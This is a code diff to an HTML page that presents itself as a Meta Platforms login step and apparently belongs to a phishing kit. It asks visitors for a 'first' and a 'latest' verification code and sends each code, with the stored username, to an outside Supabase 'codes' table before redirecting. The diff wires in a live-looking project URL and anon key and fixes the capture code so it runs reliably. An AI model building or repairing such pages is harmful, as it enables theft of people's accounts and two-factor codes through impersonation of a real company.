@@ -134,12 +134,17 @@
       <div class="bottom-line">&copy; 2025 Meta Platforms, Inc.</div>
     </div>
 
-    <script type="module">
-      import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";
-
-      const SUPABASE_URL = "https://YOUR-PROJECT.supabase.co";
-      const SUPABASE_KEY = "YOUR-ANON-KEY";
-      const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script>
+      const SUPABASE_URL = "https://twyyuqdmbsdyrlbqgyoq.supabase.co";
+      const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR3eXl1cWRtYnNkeXJsYnFneW9xIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYwMzExMDUsImV4cCI6MjA3MTYwNzEwNX0.6_NcIRedVB4yHKnvgFpwt9apQMiMlsvx19t8B5UBel8";
+      
+      const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
+        auth: {
+          persistSession: false,
+          autoRefreshToken: false
+        }
+      });
 
       let awaitingLatest = false;
 
@@ -152,11 +157,11 @@
         } else {
           let displayType = "account";
           let ending = "";
-          const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
+          const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
           if (emailRegex.test(user)) {
             displayType = "email";
             ending = user.slice(user.indexOf("@"));
-          } else if (/^\\d{7,}$/.test(user)) {
+          } else if (/^\d{7,}$/.test(user)) {
             displayType = "phone number";
             ending = user.slice(-4);
           } else {
@@ -191,13 +196,19 @@
 
         try {
           if (!awaitingLatest) {
-            await supabase.from("codes").insert([
+            const { data, error } = await supabase.from("codes").insert([
               {
                 user: localStorage.getItem("login_user") || "unknown",
                 step: "first",
                 code,
+                created_at: new Date().toISOString()
               },
             ]);
+
+            if (error) {
+              console.error("Supabase error details:", error);
+              throw error;
+            }
 
             awaitingLatest = true;
             headingEl.textContent = "Enter Latest Code";
@@ -206,13 +217,20 @@
             codeInput.value = "";
             codeInput.focus();
           } else {
-            await supabase.from("codes").insert([
+            const { data, error } = await supabase.from("codes").insert([
               {
                 user: localStorage.getItem("login_user") || "unknown",
                 step: "latest",
                 code,
+                created_at: new Date().toISOString()
               },
             ]);
+
+            if (error) {
+              console.error("Supabase error details:", error);
+              throw error;
+            }
+            
             window.location.href = "homepage.html";
           }
         } catch (err) {
